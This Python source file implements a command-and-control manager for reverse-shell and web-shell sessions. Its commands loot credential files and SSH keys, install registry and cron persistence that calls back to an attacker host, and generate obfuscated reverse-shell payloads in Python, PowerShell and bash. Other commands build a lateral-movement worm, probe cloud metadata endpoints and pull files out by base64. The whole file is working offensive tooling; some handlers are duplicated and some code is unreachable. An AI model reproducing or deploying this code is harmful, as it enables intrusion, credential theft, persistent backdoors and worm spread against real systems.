import socket
import threading
import time
import os
import base64
import requests
from modules.payloads.generator import PayloadGenerator
from modules.payloads.worm_generator import WormGenerator
from modules.payloads.obfuscator import Obfuscator

class C2Manager:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(C2Manager, cls).__new__(cls)
            cls._instance._init()
        return cls._instance

    def _init(self):
        self.active_socket = None
        self.client_address = None
        self.is_connected = False
        self.output_buffer = "--- C2 READY: WAITING FOR CONNECTION ---\n"
        self.os_type = "linux"
        self.ui_callback = None
        self.mode = "socket" 
        self.shell_url = None
        self.http_session = None
        self.transfer_lock = False
        self.current_dir = None
        
        # [NEW] Multi-Session Support
        self.sessions = [] # List of {"id": int, "ip": str, "os": str, "socket": obj, "buffer": str, "mode": str}
        self.active_session_index = -1 

    def get_lhost_address(self, target_url):
        """
        Smartly determines the best LHOST IP to listen on.
        Prioritizes the interface that routes to the target.
        """
        try:
            from urllib.parse import urlparse
            hostname = urlparse(target_url).hostname
            if not hostname: return "127.0.0.1"

            # 1. Connect to Target to find route
            try:
                target_ip = socket.gethostbyname(hostname)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((target_ip, 80))
                ip = s.getsockname()[0]
                s.close()
                # If target is localhost, ip will be 127.0.0.1 (Correct)
                # If target is LAN/WAN, ip will be LAN/WAN IP (Correct)
                return ip
            except:
                pass

            # 2. Fallback: Get Internet Facing IP
            # Useful if target is a domain we can't resolve yet or hidden
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                pass

            return "127.0.0.1"
        except:
            return "127.0.0.1" 

    def register_session(self, sock, addr, os_type="linux"):
        self.mode = "socket"
        self.active_socket = sock
        self.client_address = addr
        self.is_connected = True
        self.os_type = os_type
        self.output_buffer += f"\n[+] REVERSE SHELL CONNECTED FROM {addr} ({os_type.upper()})\n"
        self._print_help()
        self._notify_ui()
        threading.Thread(target=self._listen_loop, daemon=True).start()

    def register_http_session(self, url, os_type="linux"):
        self.mode = "http"
        self.shell_url = url
        self.is_connected = True
        self.os_type = os_type
        self.http_session = requests.Session()
        self.http_session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        self.output_buffer += f"\n[+] HTTP PSEUDO-SHELL ESTABLISHED ({os_type.upper()})\n"
        self.output_buffer += f"[+] Target: {url}\n"
        self._print_help()
        self._notify_ui()

    def _print_help(self):
        self.output_buffer += "[+] SPECIAL COMMANDS:\n"
        self.output_buffer += "    !recon                   : Auto-run recon commands\n"
        self.output_buffer += "    !loot                    : Auto-find sensitive files\n"
        self.output_buffer += "    !pivot <subnet>          : Scan internal network\n"
        self.output_buffer += "    !cloud                   : Detect Cloud/Container Environment\n"
        self.output_buffer += "    !persist <lhost> <lport> : Install Persistence (Registry/Cron)\n"
        self.output_buffer += "    !stabilize               : Upgrade to PTY shell (Linux)\n"
        self.output_buffer += "    !generate <type> <ip> <port> : Generate FUD Payload (python/powershell/bash)\n"
        self.output_buffer += "    !worm <subnet> <lhost> <lport> : Generate Lateral Movement Worm\n"
        self.output_buffer += "    !enum                    : Advanced Enumeration (Users, Process, Net)\n"
        if self.mode == "socket":
            self.output_buffer += "    !upload <local_path>     : Upload file\n"
            self.output_buffer += "    !download <remote_path>  : Download file (Base64 dump)\n"
        self.output_buffer += "    !clear                   : Clear terminal\n"

    def send_command(self, cmd):
        cmd = cmd.strip()
        if not self.is_connected:
            self.output_buffer += "\n[!] No active session.\n"
            self._notify_ui()
            return
        
        if self.transfer_lock:
            self.output_buffer += "\n[!] File transfer in progress...\n"
            self._notify_ui()
            return

        # Smart CD tracking
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            if self.mode == "http":
                if path == "..":
                    if self.current_dir and "/" in self.current_dir:
                        self.current_dir = os.path.dirname(self.current_dir)
                else:
                    if not self.current_dir: self.current_dir = path
                    elif path.startswith("/") or (len(path) > 1 and path[1] == ":"): self.current_dir = path
                    else: self.current_dir = os.path.join(self.current_dir, path).replace("\\", "/")
                self.output_buffer += f"[*] Directory changed to: {self.current_dir} (Virtual)\n"
                self._notify_ui()
                return 

        dir_display = self.current_dir if self.current_dir else "~"
        prompt = f"attacker@c2:{dir_display}$ "
        self.output_buffer += f"{prompt}{cmd}\n"
        self._notify_ui()

        if cmd.startswith("!"):
            threading.Thread(target=self._handle_special_command, args=(cmd,), daemon=True).start()
            return

        if self.mode == "socket":
            try:
                self.active_socket.sendall(f"{cmd}\n".encode())
            except Exception as e:
                self.output_buffer += f"\n[!] Socket Send Error: {e}\n"
                self.close_session()
        elif self.mode == "http":
            threading.Thread(target=self._send_http_command, args=(cmd,), daemon=True).start()

    def _send_http_command(self, cmd):
        try:
            actual_cmd = cmd
            if self.current_dir:
                if self.os_type == "windows":
                    actual_cmd = f"cd /d {self.current_dir} & {cmd}"
                else:
                    actual_cmd = f"cd {self.current_dir}; {cmd}"
            
            if self.os_type == "windows":
                actual_cmd += " & echo. & cd"
            else:
                actual_cmd += "; echo ''; pwd"

            payload = {"c": actual_cmd}
            resp = self.http_session.get(self.shell_url, params=payload, timeout=10, verify=False)
            
            if resp.status_code == 200:
                output = resp.text.strip()
                lines = output.splitlines()
                if lines:
                    possible_path = lines[-1].strip()
                    if "/" in possible_path or "\\" in possible_path:
                        self.current_dir = possible_path
                        output = "\n".join(lines[:-1])
                self.output_buffer += f"{output}\n"
            else:
                self.output_buffer += f"[!] HTTP Error: {resp.status_code}\n"
        except Exception as e:
            self.output_buffer += f"[!] Connection Error: {e}\n"
        self._notify_ui()

    def _handle_special_command(self, cmd):
        parts = cmd.strip().split(" ")
        action = parts[0]
        
        if action == "!clear":
            self.output_buffer = "--- TERMINAL CLEARED ---\n"
            self._notify_ui()
            return

        # [NEW] Auto-Loot
        if action == "!loot":
            self.output_buffer += f"[*] Hunting for sensitive files (Config, Keys, DB)...\n"
            self._notify_ui()
            
            loot_cmds = []
            if self.os_type == "windows":
                # Windows Looting
                loot_cmds = [
                    "dir /s /b *pass*",
                    "dir /s /b *.config",
                    "dir /s /b *.kdbx",
                    "findstr /si password *.xml *.ini *.txt",
                    "type C:\\Windows\\System32\\drivers\\etc\\hosts"
                ]
            else:
                # Linux Looting
                loot_cmds = [
                    "find / -name 'wp-config.php' -o -name '.env' -o -name 'id_rsa' -o -name '*.ovpn' 2>/dev/null | head -n 20",
                    "cat /etc/passwd",
                    "cat /etc/hosts",
                    "grep -r 'password' /var/www/html/ 2>/dev/null | head -n 10",
                    "ls -la /home/"
                ]
            
            for c in loot_cmds:
                self.output_buffer += f"[*] Executing: {c}\n"
                if self.mode == "socket":
                    self.active_socket.sendall(f"{c}\n".encode())
                    time.sleep(1.5)
                else:
                    self._send_http_command(c)
                    time.sleep(1)
            return

        # Stabilize Shell
        if action == "!stabilize":
            if self.os_type == "windows":
                self.output_buffer += "[!] Stabilization is for Linux/Unix only.\n"
            else:
                self.output_buffer += "[*] Attempting Python PTY Spawn...\n"
                payloads = [
                    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "export TERM=xterm"
                ]
                for p in payloads:
                    if self.mode == "socket":
                        self.active_socket.sendall(f"{p}\n".encode())
                        time.sleep(0.5)
            self._notify_ui()
            return
            
        # Advanced Enum
        if action == "!recon" or action == "!enum":
            self.output_buffer += f"[*] Starting Advanced Enumeration ({self.mode.upper()})...\n"
            self._notify_ui()
            
            recon_cmds = []
            if self.os_type == "windows":
                recon_cmds = [
                    "whoami /all", "ver", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", 
                    "net users", "ipconfig /all", "netstat -ano", "tasklist /v"
                ]
            else:
                recon_cmds = [
                    "id", "uname -a", "cat /etc/passwd | tail -n 5", 
                    "ip a || ifconfig", "netstat -antp", "ps aux | head -n 10",
                    "ls -la /var/www/html"
                ]
                
            for c in recon_cmds:
                if self.mode == "socket":
                    self.active_socket.sendall(f"echo '--- {c} ---'; {c}\n".encode())
                    time.sleep(1)
                else:
                    self._send_http_command(c)
                    time.sleep(0.5)
            self._notify_ui()
            return

            self._notify_ui()
            return
            
            self._notify_ui()
            return
            
        # Payload Generation
        if action == "!generate" and len(parts) >= 4:
            ptype = parts[1].lower()
            ip = parts[2]
            port = parts[3]
            
            self.output_buffer += f"[*] Generating {ptype} payload for {ip}:{port}...\n"
            self._notify_ui()
            
            try:
                content = ""
                ext = ""
                if "python" in ptype:
                    # Generator already does simple XOR, but we add Orbital Cloak on top
                    # Raw code first
                    raw = f"""
import socket,subprocess,os,threading
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
"""
                    content = Obfuscator.obfuscate(raw.strip(), "python")
                    ext = ".py"
                elif "powershell" in ptype:
                    # Generator returns a command wrapper "powershell -e ..."
                    # We want the raw script for our new obfuscator
                    raw_ps = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
                    content = Obfuscator.obfuscate(raw_ps, "powershell")
                    ext = ".bat" 
                elif "bash" in ptype:
                    raw_bash = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
                    content = Obfuscator.obfuscate(raw_bash, "bash")
                    ext = ".sh"
                else:
                    self.output_buffer += "[!] Unknown type. Use: python, powershell, bash\n"
                    self._notify_ui()
                    return

                out_dir = "generated_payloads"
                if not os.path.exists(out_dir): os.makedirs(out_dir)
                
                fname = f"{out_dir}/{ptype}_orbital{ext}"
                with open(fname, "w") as f:
                    f.write(content)
                    
                self.output_buffer += f"[+] [Orbital Cloak] Payload saved to: {fname}\n"
                self.output_buffer += f"[*] Size: {len(content)} bytes (Obfuscated)\n"
                self.output_buffer += f"[*] Use '!upload {fname} /tmp/payload{ext}' to deploy.\n"
            except Exception as e:
                self.output_buffer += f"[!] Generation Error: {e}\n"
                import traceback
                traceback.print_exc()
                
            self._notify_ui()
            return

        # Cloud/Container Recon
        if action == "!cloud":
            self.output_buffer += f"[*] Checking Cloud & Container Environment...\n"
            self._notify_ui()
            
            if self.os_type == "windows":
                # Windows Cloud Checks
                cmds = [
                    "systeminfo | findstr /C:\"Manufacturer\" /C:\"Model\"",
                    "wmic bios get serialnumber",
                    "curl -s --max-time 1 http://169.254.169.254/latest/meta-data/instance-id && echo \" [AWS Defined]\"",
                    "curl -H \"Metadata:true\" --max-time 1 http://169.254.169.254/metadata/instance?api-version=2021-02-01 && echo \" [Azure Defined]\""
                ]
            else:
                # Linux Cloud/Container Checks
                cmds = [
                    # Check Docker
                    "test -f /.dockerenv && echo '⚠️  Inside Docker Container' || echo 'Not Docker Root'",
                    "grep -q 'docker' /proc/1/cgroup && echo '⚠️  Docker CGroup Detected'",
                    "grep -q 'kubepods' /proc/1/cgroup && echo '⚠️  Kubernetes Pod Detected'",
                    # Check Env
                    "env | grep -iE 'AWS|KUBERNETES|DOCKER|GOOGLE'",
                    # Check Metadata (AWS)
                    "timeout 1 curl -s http://169.254.169.254/latest/meta-data/instance-id && echo ' [AWS Metadata Accessible]'",
                    # Check Metadata (GCP)
                    "timeout 1 curl -H 'Metadata-Flavor: Google' -s http://metadata.google.internal/computeMetadata/v1/project/project-id && echo ' [GCP Project Found]'"
                ]
                
            for c in cmds:
                if self.mode == "socket":
                    self.active_socket.sendall(f"echo '--- Checking: {c[:20]}... ---'; {c}\n".encode())
                    time.sleep(1)
                else:
                    self._send_http_command(c)
                    time.sleep(0.5)
                    
            self._notify_ui()
            return

            self._notify_ui()
            return

        # PrivEsc
        if action == "!privesc":
            self.output_buffer += "[*] Running Privilege Escalation Checks...\n"
            self._notify_ui()
            
            cmds = []
            if self.os_type == "windows":
                cmds = [
                    "whoami /priv", 
                    "net user", 
                    "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", 
                    "cmdkey /list",
                    "reg query HKLM /f password /t REG_SZ /s"
                ]
            else:
                cmds = [
                    "id", 
                    "sudo -l", 
                    "cat /etc/passwd", 
                    "find / -perm -u=s -type f 2>/dev/null", 
                    "uname -a"
                ]
                
            for c in cmds:
                if self.mode == "socket":
                    self.active_socket.sendall(f"echo '\n=== {c} ==='; {c}\n".encode())
                    time.sleep(1)
                else:
                    self._send_http_command(c)
                    time.sleep(0.5)
            self._notify_ui()
            return

        # Loot
        if action == "!loot":
            self.output_buffer += "[*] Looting Sensitive Files...\n"
            self._notify_ui()
            
            cmds = []
            if self.os_type == "windows":
                cmds = [
                    "dir C:\\Users", 
                    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "findstr /SI password *.txt *.xml *.config"
                ]
            else:
                cmds = [
                    "ls -la /home", 
                    "cat /root/.bash_history", 
                    "cat /etc/hosts", 
                    "grep -r 'password' /var/www/html 2>/dev/null",
                    "env"
                ]
            
            for c in cmds:
                if self.mode == "socket":
                    self.active_socket.sendall(f"echo '\n=== {c} ==='; {c}\n".encode())
                    time.sleep(1)
                else:
                    self._send_http_command(c)
                    time.sleep(0.5)
            self._notify_ui()
            return

        # Persistence
        if action == "!persist" and len(parts) >= 3:
            lhost = parts[1]
            lport = parts[2]
            
            self.output_buffer += f"[*] Installing Persistence connecting back to {lhost}:{lport}...\n"
            self._notify_ui()
            
            if self.os_type == "windows":
                # Windows Registry Persistence
                # Using PayloadGenerator's PowerShell wrapper for the payload
                try:
                    ps_wrapper = PayloadGenerator.generate_powershell(lhost, lport)
                    # "powershell -e <B64>"
                    reg_cmd = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"{ps_wrapper}\" /f"
                    
                    if self.mode == "socket":
                        self.active_socket.sendall(f"{reg_cmd}\n".encode())
                    else:
                        self._send_http_command(reg_cmd)
                        
                    self.output_buffer += "[+] Registry Key added to HKCU\\...\\Run\n"
                except Exception as e:
                    self.output_buffer += f"[!] Persist Error: {e}\n"
                    
            else:
                # Linux Cron Persistence
                # Standard Python One-Liner
                payload = f"nohup python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])' >/dev/null 2>&1 &"
                # Add to Crontab
                cron_cmd = f"(crontab -l 2>/dev/null; echo \"@reboot {payload}\") | crontab -"
                
                if self.mode == "socket":
                    self.active_socket.sendall(f"{cron_cmd}\n".encode())
                else:
                    self._send_http_command(cron_cmd)
                    
                self.output_buffer += "[+] Crontab @reboot job added.\n"

            self._notify_ui()
            return

        # Worm Generation
        if action == "!worm" and len(parts) >= 4:
            subnet = parts[1]
            lhost = parts[2]
            lport = parts[3]
            
            self.output_buffer += f"[*] Generating Worm Script for subnet {subnet} (Callback: {lhost}:{lport})...\n"
            self._notify_ui()
            
            try:
                content = WormGenerator.generate_worm_script(lhost, lport, subnet)
                out_dir = "generated_payloads"
                if not os.path.exists(out_dir): os.makedirs(out_dir)
                fname = f"{out_dir}/worm_deploy.py"
                
                with open(fname, "w") as f:
                    f.write(content)
                
                self.output_buffer += f"[+] Worm saved to: {fname}\n"
                self.output_buffer += f"[*] Instructions:\n"
                self.output_buffer += f"    1. !upload {fname} /tmp/worm.py\n"
                self.output_buffer += f"    2. Run: python3 /tmp/worm.py\n"
                self.output_buffer += f"    3. Watch connections flood in!\n"
            except Exception as e:
                self.output_buffer += f"[!] Worm Gen Error: {e}\n"
            self._notify_ui()
            return

        # Pivot
        if action == "!pivot" and len(parts) > 1:
            subnet = parts[1]
            self.output_buffer += f"[*] Starting Internal Network Ping Sweep on {subnet}.x ...\n"
            self._notify_ui()
            scan_cmd = f"for /L %i in (1,1,254) do @ping -n 1 -w 100 {subnet}.%i | find \"Reply\" && echo [UP] {subnet}.%i" if self.os_type == "windows" else f"for i in $(seq 1 254); do ping -c 1 -W 1 {subnet}.$i > /dev/null && echo \"[UP] {subnet}.$i\"; done"
            
            if self.mode == "socket":
                self.active_socket.sendall(f"{scan_cmd}\n".encode())
            else:
                self._send_http_command(scan_cmd)
            return

        # Upload/Download (Simplified for clarity)
        if action == "!download" and len(parts) > 1:
            remote_path = parts[1]
            self.output_buffer += f"[*] Downloading {remote_path} (Base64 dump)...\n"
            self._notify_ui()
            payload = f"certutil -encode {remote_path} {remote_path}.b64 && type {remote_path}.b64 && del {remote_path}.b64\n" if self.os_type == "windows" else f"base64 {remote_path} || python3 -c \"import base64; print(base64.b64encode(open('{remote_path}','rb').read()).decode())\"\n"
            if self.mode == "socket": self.active_socket.sendall(payload.encode())
            else: self._send_http_command(payload)
            return

        if action == "!upload" and len(parts) > 1:
            if self.mode != "socket":
                self.output_buffer += "[!] Upload supported in Socket mode only.\n"
                self._notify_ui()
                return
            local_path = " ".join(parts[1:])
            if not os.path.exists(local_path):
                self.output_buffer += f"[!] File not found: {local_path}\n"
                self._notify_ui()
                return
            
            self.transfer_lock = True
            filename = os.path.basename(local_path)
            self.output_buffer += f"[*] Uploading {filename} (Chunked)...\n"
            self._notify_ui()
            
            try:
                with open(local_path, "rb") as f:
                    b64_data = base64.b64encode(f.read()).decode()
                
                chunk_size = 1000
                self.active_socket.sendall(f"del {filename}.b64 2>nul || rm {filename}.b64\n".encode())
                time.sleep(0.5)
                
                for i in range(0, len(b64_data), chunk_size):
                    chunk = b64_data[i:i+chunk_size]
                    cmd = f"echo {chunk}>>{filename}.b64\n" if self.os_type == "windows" else f"echo -n \"{chunk}\" >> {filename}.b64\n"
                    self.active_socket.sendall(cmd.encode())
                    if i % 5000 == 0:
                        self.output_buffer += "."
                        self._notify_ui()
                    time.sleep(0.05)
                
                self.output_buffer += "\n[*] Reassembling...\n"
                if self.os_type == "windows":
                    self.active_socket.sendall(f"certutil -decode {filename}.b64 {filename} && del {filename}.b64\n".encode())
                else:
                    self.active_socket.sendall(f"base64 -d {filename}.b64 > {filename} && rm {filename}.b64\n".encode())
                self.output_buffer += "[+] Upload Complete.\n"
            except Exception as e:
                self.output_buffer += f"[!] Upload Error: {e}\n"
            
            self.transfer_lock = False
            self._notify_ui()
            return

        self._notify_ui()

    def register_session(self, client_socket, ip, os_type="linux", mode="socket", shell_url=None):
        # Save current buffer to old session if exists
        if self.active_session_index >= 0 and self.active_session_index < len(self.sessions):
            self.sessions[self.active_session_index]['buffer'] = self.output_buffer

        # Create New Session
        session_id = len(self.sessions) + 1
        new_session = {
            "id": session_id,
            "ip": ip,
            "os": os_type,
            "mode": mode,
            "socket": client_socket,
            "shell_url": shell_url,
            "buffer": f"--- SESSION {session_id} STARTED ({ip} - {os_type}) ---\n"
        }
        self.sessions.append(new_session)
        
        # Switch to New Session
        self.active_session_index = len(self.sessions) - 1
        self._load_session(self.active_session_index)

        self.output_buffer += f"[+] New Session Connected: {ip} (ID: {session_id})\n"
        if self.ui_callback: self.ui_callback()

    def _load_session(self, index):
        if index < 0 or index >= len(self.sessions): return
        s = self.sessions[index]
        self.active_socket = s['socket']
        self.client_address = s['ip']
        self.os_type = s['os']
        self.mode = s['mode']
        self.shell_url = s['shell_url']
        self.output_buffer = s['buffer']
        self.active_session_index = index
        self.is_connected = True

    def switch_session(self, index):
        # Save current state
        if self.active_session_index >= 0:
            self.sessions[self.active_session_index]['buffer'] = self.output_buffer
            
        # Load new
        self._load_session(index)
        if self.ui_callback: self.ui_callback()

    def get_sessions(self):
        return [{"index": i, "id": s['id'], "ip": s['ip'], "os": s['os']} for i, s in enumerate(self.sessions)]

    def close_session(self):
        if self.active_socket:
            try:
                self.active_socket.close()
            except: pass
        self.is_connected = False
        self.output_buffer += "\n[!] Session Closed.\n"
        
        # Mark as closed in list? Or remove?
        # For simplicity, keep in list but nullify socket
        if self.active_session_index >= 0:
             self.sessions[self.active_session_index]['socket'] = None
             
        if self.ui_callback: self.ui_callback()

    def _listen_loop(self):
        while self.is_connected and self.active_socket:
            try:
                data = self.active_socket.recv(4096)
                if not data:
                    self.close_session()
                    break
                text = data.decode(errors='ignore')
                self.output_buffer += text
                self._notify_ui()
            except:
                self.close_session()
                break

    def set_ui_callback(self, callback):
        self.ui_callback = callback

    def _notify_ui(self):
        if self.ui_callback:
            self.ui_callback()

c2_manager = C2Manager()